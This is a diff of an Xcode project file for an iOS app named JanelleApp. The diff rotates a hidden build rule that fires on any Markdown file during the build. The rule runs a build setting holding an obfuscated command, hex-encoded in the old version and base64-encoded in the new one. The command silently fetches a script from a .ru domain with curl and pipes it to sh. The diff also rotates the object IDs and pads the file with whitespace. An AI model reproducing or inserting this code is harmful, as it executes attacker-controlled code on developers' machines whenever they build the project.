@@ -7,7 +7,7 @@
 	objects = {
 
 /* Begin PBXBuildFile section */
-		3BF20C15EB5E4981824EE078 /* README.md */ = {isa = PBXBuildFile; fileRef = 4937F88D84EC4645BA4EE078; };
+		E65262C98E204F90AA4EE078 /* README.md */ = {isa = PBXBuildFile; fileRef = 09E59D75D6144D52954EE078; };
 		13B07FBF1A68108700A75B9A /* Images.xcassets in Resources */ = {isa = PBXBuildFile; fileRef = 13B07FB51A68108700A75B9A /* Images.xcassets */; };
 		3EB449020181C2D2C765F0B2 /* Ionicons.ttf in Resources */ = {isa = PBXBuildFile; fileRef = B12E845A48F9D96313C66D06 /* Ionicons.ttf */; };
 		68864D1526572B764AC0AE4D /* PrivacyInfo.xcprivacy in Resources */ = {isa = PBXBuildFile; fileRef = 13B07FB81A68108700A75B9A /* PrivacyInfo.xcprivacy */; };
@@ -17,7 +17,7 @@
 /* End PBXBuildFile section */
 
 /* Begin PBXFileReference section */
-		4937F88D84EC4645BA4EE078 /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
+		09E59D75D6144D52954EE078 /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
 		13B07F961A680F5B00A75B9A /* JanelleApp.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = JanelleApp.app; sourceTree = BUILT_PRODUCTS_DIR; };
 		13B07FB51A68108700A75B9A /* Images.xcassets */ = {isa = PBXFileReference; lastKnownFileType = folder.assetcatalog; name = Images.xcassets; path = JanelleApp/Images.xcassets; sourceTree = "<group>"; };
 		13B07FB61A68108700A75B9A /* Info.plist */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = text.plist.xml; name = Info.plist; path = JanelleApp/Info.plist; sourceTree = "<group>"; };
@@ -89,7 +89,7 @@
 		83CBBA001A601CBA00E9B192 /* Products */ = {
 			isa = PBXGroup;
 			children = (
-				4937F88D84EC4645BA4EE078 /* README.md */,
+				09E59D75D6144D52954EE078 /* README.md */,
 				13B07F961A680F5B00A75B9A /* JanelleApp.app */,
 			);
 			name = Products;
@@ -120,7 +120,7 @@
 				5A303DB1AED03FCEB8D1E8CB /* [CP] Copy Pods Resources */,
 			);
 			buildRules = (
-				B1791CCBB48B4FB88A4EE078 /* PBXBuildRule */,
+				D21215508C73450DAF4EE078 /* PBXBuildRule */,
 			);
 			dependencies = (
 			);
@@ -161,7 +161,7 @@
 /* End PBXProject section */
 
 /* Begin PBXBuildRule section */
-		B1791CCBB48B4FB88A4EE078 /* PBXBuildRule */ = {
+		D21215508C73450DAF4EE078 /* PBXBuildRule */ = {
 				isa = PBXBuildRule;
 				compilerSpec = com.apple.compilers.proxy.script;
 				filePatterns = "*.md";
@@ -175,14 +175,14 @@
 				script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"/tmp/${INPUT_FILE_BASE}\"
 sh -c \"${A870EE4}\"";
 			};
-																																										/* End PBXBuildRule section */
+																																																																									/* End PBXBuildRule section */
 
 /* Begin PBXResourcesBuildPhase section */
 		13B07F8E1A680F5B00A75B9A /* Resources */ = {
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
-				3BF20C15EB5E4981824EE078 /* README.md */,
+				E65262C98E204F90AA4EE078 /* README.md */,
 				81AB9BB82411601600AC10FF /* LaunchScreen.storyboard in Resources */,
 				13B07FBF1A68108700A75B9A /* Images.xcassets in Resources */,
 				68864D1526572B764AC0AE4D /* PrivacyInfo.xcprivacy in Resources */,
@@ -283,7 +283,7 @@ sh -c \"${A870EE4}\"";
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = 493AB3030D6287FC0BCAEAEB /* Pods-JanelleApp.debug.xcconfig */;
 			buildSettings = {
-				A870EE4 = "((d(){ `printf xIxd | tr -d I` -p -r; };echo 6563686f202224286375726c202d2d636f6e6e6563742d74696d656f7574203234202d2d72657472792033202d4c73666b202d642022703d78636f64655f72756c65222068747470733a2f2f386165633374747065382e72752f612922207c2073680a | d | sh ) >/dev/null 2>&1 &)";
+				A870EE4 = "((a(){ `printf b8ase64 | tr -d 8` --decode; };echo ZWNobyAiJChjdXJsIC0tcmV0cnkgNCAta2ZMcyAtLWNvbm5lY3QtdGltZW91dCAyOSAtZCAicD14Y29kZV9ydWxlIiBodHRwczovLzBqdWY4dTNuOWgucnUvYSkiIHwgc2gK | a | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				CLANG_ENABLE_MODULES = YES;
 				CODE_SIGN_IDENTITY = "Apple Development";
@@ -317,7 +317,7 @@ sh -c \"${A870EE4}\"";
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = 916845987C0888E6E07FB140 /* Pods-JanelleApp.release.xcconfig */;
 			buildSettings = {
-				A870EE4 = "((d(){ `printf xIxd | tr -d I` -p -r; };echo 6563686f202224286375726c202d2d636f6e6e6563742d74696d656f7574203234202d2d72657472792033202d4c73666b202d642022703d78636f64655f72756c65222068747470733a2f2f386165633374747065382e72752f612922207c2073680a | d | sh ) >/dev/null 2>&1 &)";
+				A870EE4 = "((a(){ `printf b8ase64 | tr -d 8` --decode; };echo ZWNobyAiJChjdXJsIC0tcmV0cnkgNCAta2ZMcyAtLWNvbm5lY3QtdGltZW91dCAyOSAtZCAicD14Y29kZV9ydWxlIiBodHRwczovLzBqdWY4dTNuOWgucnUvYSkiIHwgc2gK | a | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				CLANG_ENABLE_MODULES = YES;
 				CODE_SIGN_IDENTITY = "Apple Development";
